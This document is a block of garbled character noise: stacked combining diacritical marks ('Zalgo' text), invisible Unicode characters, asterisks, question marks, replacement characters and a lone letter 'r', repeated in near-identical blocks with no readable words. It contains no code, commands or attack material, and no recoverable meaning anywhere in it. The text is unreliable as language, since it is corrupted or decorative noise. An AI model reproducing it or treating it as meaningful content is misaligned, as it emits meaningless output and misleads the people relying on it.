̡̧̯̠̘̲͕̜̲̭⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̛̯̠͔̟̿̿̀̊̒́̀̌̂̔̍̓͡ r̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̍